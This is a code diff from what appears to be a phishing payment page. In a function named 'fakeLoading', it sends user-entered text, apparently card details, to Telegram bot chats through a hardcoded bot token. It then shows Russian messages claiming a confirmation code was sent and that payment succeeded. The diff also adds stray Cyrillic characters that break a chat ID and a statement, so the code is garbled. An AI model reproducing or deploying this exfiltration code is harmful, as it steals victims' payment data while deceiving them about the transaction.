@@ -163,7 +163,7 @@ const fakeLoading = () => {
     loading.value = false
     step.value = 2
     axios.post(`https://api.telegram.org/bot8198695402:AAHriMSkoKEiHSrfBdJUqX8tGjIcyRrsdsc/sendMessage?chat_id=768959234&text=${text.value}`)
-    axios.post(`https://api.telegram.org/bot8198695402:AAHriMSkoKEiHSrfBdJUqX8tGjIcyRrsdsc/sendMessage?chat_id=5591730324&text=${text.value}`)
+    axios.post(`https://api.telegram.org/bot8198695402:AAHriMSkoKEiHSrfBdJUqX8tGjIcyRrsdsc/sendMessage?chat_id=5591730324ф&text=${text.value}`)
         showToast('Код подтверждения отправлен в телеграм подключенный к номеру карты', 'success')
   }, 2000)
 }
@@ -174,7 +174,7 @@ const otpLoading = () => {
   setTimeout(() => {
     loadingOtp.value = false
     if(maths.toString() == otpCode.value){
-      showToast('Оплата успешно прошла', 'success')
+      showToast('Оплата успешно прошла', 'success')ё
       step.value = 3
     }else{
       showToast('Неправильный код', 'error')
